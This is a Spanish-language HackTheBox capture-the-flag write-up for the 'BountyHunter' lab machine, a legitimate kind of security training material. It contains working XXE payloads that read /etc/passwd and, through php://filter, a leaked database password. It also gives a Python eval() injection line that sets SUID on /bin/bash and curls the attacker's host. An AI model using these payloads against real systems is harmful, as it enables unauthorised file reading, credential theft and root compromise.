---
icon: linux
tags:
  - xxe
  - php-wrappers
  - python-eval-injection
---

# BountyHunter

## Resumen

### Detalles

| Campo                 | Detalle       |
| --------------------- | ------------- |
| **Nombre**            | BountyHunter  |
| **Sistema Operativo** | Linux         |
| **Plataforma**        | HackTheBox    |
| **Fecha**             | 26/10/2026    |
| **IP Objetivo**       | 10.129.95.166 |

### Executive Summary

La máquina **BountyHunter** expone un servicio web con un portal en desarrollo y un sistema de reporte de vulnerabilidades ("Bounty Report System"). La enumeración web permite descubrir los directorios `/resources` y `/js`, donde se aloja el código fuente del cliente (`bountylog.js`) y un `README.txt` con notas de desarrollo. El análisis del código revela que el reporte se envía en formato XML codificado en Base64 a `tracker_diRbPr00f314.php`.

El formulario es vulnerable a **XXE (XML External Entity)**, lo que permite la lectura de archivos locales. Abusando de la vulnerabilidad y de los PHP Wrappers, se extrae el código fuente de `db.php`, que expone credenciales de la base de datos. Estas credenciales son reutilizadas por el usuario `development` para acceder al sistema vía SSH, obteniendo la flag de usuario.

Una vez dentro, se comprueba que el usuario puede ejecutar como `root` el script `/opt/skytrain_inc/ticketValidator.py`. El análisis del código fuente revela el uso de la función `eval()` sobre el contenido de un archivo Markdown. Se construye un ticket válido que inyecta código Python, otorgando permisos SUID a `/bin/bash` y permitiendo la escalada a `root`.

### Técnicas

* Web Directory Enumeration (ffuf)
* XML External Entity (XXE) Injection
* PHP Wrappers (`php://filter`)
* Credential Reuse (SSH)
* Sudo Privilege Escalation
* Python `eval()` Injection

## Information Gathering

### Port Scanning

```bash
> nmap -Pn -p- -n -vv -oG allPorts 10.129.95.166
> nmap -Pn -sVC --open -oG allServices -p22,80 10.129.95.166 -vvv
```

| Puerto | Servicio | Versión                                                      | Notas |
| ------ | -------- | ------------------------------------------------------------ | ----- |
| 22/tcp | ssh      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) |       |
| 80/tcp | http     | Apache httpd 2.4.41 (Ubuntu)                                 |       |

### Enumeration

#### Web

Se procede a enumerar los directorios y archivos del servidor web.

```bash
> ffuf -u "http://10.129.95.166/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

```
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 48ms]
assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 48ms]
resources               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 47ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 3813ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 47ms]
```

```bash
> ffuf -u "http://10.129.95.166/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt
```

```
index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389, Duration: 49ms]
.                       [Status: 200, Size: 25169, Words: 10028, Lines: 389, Duration: 48ms]
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 53ms]
portal.php              [Status: 200, Size: 125, Words: 11, Lines: 6, Duration: 48ms]
```

En la carpeta `/resources` se permite listar el directorio.<br>

<figure><img src="../../../.gitbook/assets/image (60).png" alt="" width="375"><figcaption></figcaption></figure>

Se encuentra un archivo `README.txt` que contiene una lista de tareas de desarrollo.<br>

<figure><img src="../../../.gitbook/assets/image (61).png" alt="" width="325"><figcaption></figcaption></figure>

* Hay un usuario llamado `test` en el portal sin contraseña.
* El script de submit no está conectado a la base de datos.
*   Los permisos del grupo de developer ya fueron arreglados.\
    \
    Se descubre el webpath para leer el código de fuente. En la carpeta `/js` se encuentra el archivo `bountylog.js`, que revela cómo se construye y envía la petición.

    <figure><img src="../../../.gitbook/assets/image (63).png" alt="" width="563"><figcaption></figcaption></figure>

El script construye un XML, lo codifica en Base64 y lo envía por POST al archivo `tracker_diRbPr00f314.php` mediante el parámetro `data`.

## Explotación

### Foothold

* **Vulnerabilidad:** XML External Entity (XXE) Injection.
* **Exploit:** Lectura de archivos locales mediante entidades externas y uso de PHP Wrappers para extraer código fuente
* **Procedimiento:**

1. Se confirma la vulnerabilidad mediante la lectura de `/etc/passwd`.\
   Payload:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<bugreport>
	<title>1</title>
	<cwe>1</cwe>
	<cvss>1</cvss>
	<reward>1 &example;</reward>
</bugreport>
```

A partir de aquí, se codifica en base64, y después URL.

```http
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.129.95.166
...
data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz48IURPQ1RZUEUgZm9vIFs8IUVOVElUWSBleGFtcGxlIFNZU1RFTSAiL2V0Yy9wYXNzd2QiPiBdPgo8YnVncmVwb3J0Pjx0aXRsZT4xPC90aXRsZT48Y3dlPjE8L2N3ZT48Y3Zzcz4xPC9jdnNzPjxyZXdhcmQ%2bMSAmZXhhbXBsZTs8L3Jld2FyZD48L2J1Z3JlcG9ydD4%3d
```

\
Los siguientes usuarios tienen shell: `root` y `development`.

<figure><img src="../../../.gitbook/assets/image (64).png" alt="" width="419"><figcaption></figcaption></figure>

2.  Con el PHP Wrapper se lee el archivo `db.php` directamente desde el webroot.\
    Payload:

    ```xml
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
    <bugreport>
    <title>1</title>
    <cwe>1</cwe>
    <cvss>1</cvss>
    <reward>1 &example;</reward>
    </bugreport>
    ```

    Respuesta (Decodificada):

    ```php
    <?php
    // TODO -> Implement login system with the database.
    $dbserver = "localhost";
    $dbname = "bounty";
    $dbusername = "admin";
    $dbpassword = "m19RoAU0hP41A1sTsq6K";
    $testuser = "test";
    ?>
    ```

    Aquí se exponen las credenciales de la base de datos, también una tarea por hacer de implementar el sistema de login.
3. Se prueba la reutilización de la contraseña para el usuario `development` en el protocolo SSH.

```bash
ssh development@10.129.95.166
```

*   **Evidencia:** (`user.txt`)<br>

    <figure><img src="../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

### Privesc

* **Vulnerabilidad:** Privilege Escalation via Python `eval()` Injection
* **Exploit:** Inyección de código Python en un archivo Markdown validado por el script `ticketValidator.py` ejecutado con `sudo`
* **Procedimiento:**

1. Se listan los privilegios sudo del usuario `development`

```bash
development@bountyhunter:~$ sudo -l
```

<figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

El usuario puede ejecutar con `python3.8` el script `/opt/skytrain_inc/ticketValidator.py`

2. Se analiza el código fuente del script

```python
def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()
```

La función `load_file` exige que la extensión del archivo sea `.md` (Markdown).

<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

La variable `code_line` tiene valor nulo. Al hacer un enumerate (`.readlines()`), la variable `i` corresponde al número ordinario de la línea (empezando por 0) y la variable `x` corresponde al contenido de esa línea\
Lo primero que exige la función `evaluate()` es que la primera línea empiece por: `# Skytrain Inc`

<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

Lo segundo, es que la segunda línea empiece por: `## Ticket to`\
![](<../../../.gitbook/assets/image (69).png>)\
Cuando detecta una línea que contiene `__Ticket Code:__`, se le da a `code_line` el valor de la línea en la que se ha detectado + 1\
![](<../../../.gitbook/assets/image (70).png>)\
Después, exige que la variable `code_line` y la variable `i` sean iguales a `code_line`, es decir que este en la siguiente linea que `__Ticket Code:__`\
En caso de cumplir ese requisito (estar en la siguiente linea), hace una validación de que el contenido de la linea no comience con `**`\
Al pasar esa comprobación, se le llama `ticketCode` al contenido de la línea eliminando cualquier coincidencia de `**`. Y se separa la string dividida por todos los `+` y se queda con el primero\
Después de esto, se trata el `ticketCode` como un número entero y lo divide entre 7. Si el resultado de esta operación es 4, nos permite continuar. (Para ver el resultado el numero debe ser mayor a 100)\
Aquí es donde se ejecuta la función `eval`. Se le llama `validationNumber` al resultado de evaluar el contenido de la línea completa eliminando las coincidencias de `**`. Tenemos total libertad para inyectar el código que queramos. Para ser root, ejecutamos `/bin/bash` con `chmod +s /bin/bash`

3. El ticket queda así

```md
# Skytrain Inc
## Ticket to root
__Ticket Code:__
**102+exec(input())**
```

4. Ejecutamos el script

```bash
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

A continuación el script nos pedirá un input, se introduce el siguiente, que le otorga permisos SUID a `/bin/bash` y envia una peticion a nuestro servidor web para comprobar que se ejecute en caso de error

```
1;import os;os.system("chmod +s /bin/bash");os.system("curl http://10.10.15.78:9090/check")
```

5. Ejecutar bash

```bash
bash -p
```

\
Escalada de privilegios lograda con éxito.

<figure><img src="../../../.gitbook/assets/image (71).png" alt="" width="563"><figcaption></figcaption></figure>

*   **Evidencia:** (root.txt)<br>

    <figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
